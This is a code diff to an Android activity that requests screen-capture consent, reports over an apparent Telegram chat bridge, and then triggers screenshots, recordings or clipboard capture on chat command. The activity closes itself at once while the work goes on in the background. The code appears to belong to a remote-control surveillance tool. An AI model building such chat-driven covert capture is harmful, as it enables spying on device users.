@@ -10,31 +10,35 @@ import android.os.Bundle;
 import android.view.Gravity;
 import android.widget.TextView;
 
-/** Consentimento da captura - janela VISIVEL obrigatoria (A14+ nega projecao sem ela). */
+/** Consentimento - blindado: qualquer erro vem pro chat com o texto exato. */
 public class ShotConsentActivity extends Activity {
 
     @Override
     protected void onCreate(Bundle b) {
         super.onCreate(b);
-        TextView tv = new TextView(this);
-        tv.setText("Autorizando captura de tela…");
-        tv.setTextSize(16);
-        tv.setTextColor(Color.DKGRAY);
-        tv.setGravity(Gravity.CENTER);
-        setContentView(tv);
-        MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
-        startActivityForResult(mpm.createScreenCaptureIntent(), 1001);
+        try {
+            TextView tv = new TextView(this);
+            tv.setText("Autorizando captura de tela…");
+            tv.setTextSize(16);
+            tv.setTextColor(Color.DKGRAY);
+            tv.setGravity(Gravity.CENTER);
+            setContentView(tv);
+            MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+            startActivityForResult(mpm.createScreenCaptureIntent(), 1001);
+        } catch (Throwable t) {
+            if (BridgeHolder.tg != null) BridgeHolder.tg.say("consent: CRASH onCreate: " + t);
+            finish();
+        }
     }
 
     @Override
     protected void onActivityResult(int req, int resultCode, Intent data) {
         super.onActivityResult(req, resultCode, data);
         finish(); // some na hora do INICIAR - o resto rola na thread de fundo
-        finish(); // some na hora: o trabalho continua na thread de fundo
-        if (BridgeHolder.tg == null) { finish(); return; }
-        if (req != 1001) { finish(); return; }
         new Thread(() -> {
             android.os.Looper.prepare(); // getMediaProjection cria Handler interno: exige Looper
+            if (BridgeHolder.tg == null) return;
+            if (req != 1001) return;
             BridgeHolder.tg.say("shot: consentimento respondido (code " + resultCode + ")");
             if (resultCode == RESULT_OK && data != null) {
                 try {
@@ -55,32 +59,32 @@ public class ShotConsentActivity extends Activity {
                             try { Thread.sleep(500); } catch (InterruptedException ignored) { }
                         }
                     }
-                    if (mp == null && ultima != null) throw ultima;
                     if (mp == null) {
-                        BridgeHolder.tg.say("shot: sistema NEGOU a projecao (nulo) - tela visivel nao bastou");
-                    } else {
-                        mp.registerCallback(new MediaProjection.Callback() {
-                            @Override public void onStop() {
-                                BridgeHolder.projection = null;
-                                if (BridgeHolder.tg != null)
-                                    BridgeHolder.tg.say("projecao: sessao ENCERRADA PELO SISTEMA");
-                            }
-                        }, null);
-                        BridgeHolder.projection = mp;
-                        BridgeHolder.tg.say("shot: captura autorizada! mande 'shot' pra fotografar");
-                        if (BridgeHolder.shotPendente) {
-                            BridgeHolder.shotPendente = false;
-                            RelayService.dispararCaptura();
+                        if (ultima != null) throw ultima;
+                        BridgeHolder.tg.say("shot: projecao nula sem excecao");
+                        return;
+                    }
+                    mp.registerCallback(new MediaProjection.Callback() {
+                        @Override public void onStop() {
+                            BridgeHolder.projection = null;
+                            if (BridgeHolder.tg != null)
+                                BridgeHolder.tg.say("projecao: sessao ENCERRADA PELO SISTEMA");
                         }
-                        if (BridgeHolder.recPendente > 0) {
-                            int secs = BridgeHolder.recPendente;
-                            BridgeHolder.recPendente = 0;
-                            RelayService.dispararRec(secs);
-                        }
-                        if (BridgeHolder.clipPendente) {
-                            BridgeHolder.clipPendente = false;
-                            RelayService.armarClip();
-                        }
+                    }, null);
+                    BridgeHolder.projection = mp;
+                    BridgeHolder.tg.say("shot: captura autorizada! mande 'shot' pra fotografar");
+                    if (BridgeHolder.shotPendente) {
+                        BridgeHolder.shotPendente = false;
+                        RelayService.dispararCaptura();
+                    }
+                    if (BridgeHolder.recPendente > 0) {
+                        int secs = BridgeHolder.recPendente;
+                        BridgeHolder.recPendente = 0;
+                        RelayService.dispararRec(secs);
+                    }
+                    if (BridgeHolder.clipPendente) {
+                        BridgeHolder.clipPendente = false;
+                        RelayService.armarClip();
                     }
                 } catch (Throwable t) {
                     BridgeHolder.tg.say("shot: erro projecao: " + t);
